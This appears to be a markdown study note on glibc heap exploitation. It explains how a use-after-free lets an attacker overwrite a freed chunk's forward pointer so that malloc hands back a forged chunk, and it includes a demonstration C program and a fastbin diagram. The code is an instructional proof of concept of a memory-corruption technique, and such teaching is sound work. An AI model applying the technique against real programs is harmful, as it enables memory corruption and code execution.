---
layout: default
title:
tags: 

---
After a chunk is freed, it is inserted inside a bin, but the pointer is available in the program. If the attacker has control of this pointer via [Use after free](./Use-after-free.md) or [Double_Free](Double_Free.md) they can modify the linked list structure in bins and insert their own forged chunks.

`gcc fake_chunk.c -o chall`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct fake_chunk {
    size_t prev_size;
    size_t size;
    struct fake_chunk *fd;
    struct fake_chunk *bk;
    char buf[10];
};

int main() {
    char *a = malloc(10);
    printf("a ptr : %p\n", a);

    struct fake_chunk chunk;
    printf("fake chunks addr %p\n", &chunk);
    chunk.size = 0x20;
    char *data = (char*)&chunk.fd;
    strcpy(data, "Attacker's data : Hacked");

    free(a);

    *((unsigned long long*)a) = (unsigned long long)&chunk;
    printf("Freed ptr a\na now points to %p which is equal to fake chunk %p\n", a, &chunk);

    char *b = malloc(10); // returns same ptr as a

    char *victim = malloc(10);
    printf("Allocate 2 more chunks\nb ptr (same chunks as a): %p\nvictim ptr : %p\n", b, victim );
    
    printf("%s\n", victim);

    return 0;
```



```
1. a is freed:
fastbin : head->a->tail

2. a's fd pointer is changed to point to 'fake chunk':
fastbin : head->a->fake chunks -> undefined 
(fd of fake chunk will be holding attacker's data)

3. malloc request:
fastbin :  head -> forged chunk -> undefind
a is returned

4. malloc request:
fastbin : head -> undefined [fake chunk is returned ]
```


- Another `malloc` request for the fast chunk in the same bin will result in a segmentation fault. 
- 